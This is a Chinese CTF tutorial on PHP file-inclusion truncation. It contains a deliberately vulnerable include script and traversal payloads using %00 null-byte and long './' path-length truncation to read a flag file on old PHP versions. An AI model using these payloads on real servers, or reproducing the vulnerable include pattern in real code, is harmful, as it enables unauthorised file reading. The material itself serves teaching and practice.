## 0x01 CTF中的文件包含

文件包含在CTF中算是一种比较常见的题型。如果单独作为一题的话基本上都是考你能否找到这个文件。还有一种就是混合型的和其他知识点一起考，通过文件包含找到源码然后再代码审计。

## 0x02 常规截断

要求：

- php版本小于5.3.4
- magic_quotes_gpc为off状态

漏洞文件index.php

```php
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>
```

flag文件放在上层目录

这里限制了后缀名，我们需要通过截断才能访问到flag文件 利用代码：

```text
index.php?file=../../flag.php%00
```

  

![](https://pic3.zhimg.com/80/v2-0f8bb8b0f13f0c41f911567e5c04a7e2_720w.webp)

  
  

%00 会被解析为0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制

## 0x03 路径长度截断

我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。 如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉

  

![](https://pic4.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_720w.webp)

  
  

那么我们这时候有没有办法绕过这个限制呢？ 答案是肯定的，但依旧有一个条件那就是php版本小于5.3.10 我们的代码依旧不变 漏洞文件index.php

```php
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>
```

  

flag文件放在上层目录 这时我们可以使用字符 . /. 和 ./ 来进行绕过，因为文件路径有长度限制

- windows 259个bytes
- linux 4096个bytes

在windows下需要.字符最少的利用POC1：

```text
file=../../flag.php..............................................................................................................................................................................................................................................
```

  

![](https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_720w.webp)

  
  

在windows下需要.字符最少的利用POC2：

```text
file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

  

![](https://pic3.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_720w.webp)

  

将flag.php改为flag1.php 在windows下需要.字符最少的利用POC3：

```text
file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

  

![](https://pic2.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_720w.webp)

  

我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3

## 0x04 总结

使用截断的时候根据题目的具体情况使用不同的截断方法，遇到奇偶问题的时候我们可以丢一串很长的./到URL后面然后再调整第一个字符即可。一般来说%00就足够了，当%00不行时再尝试./的组合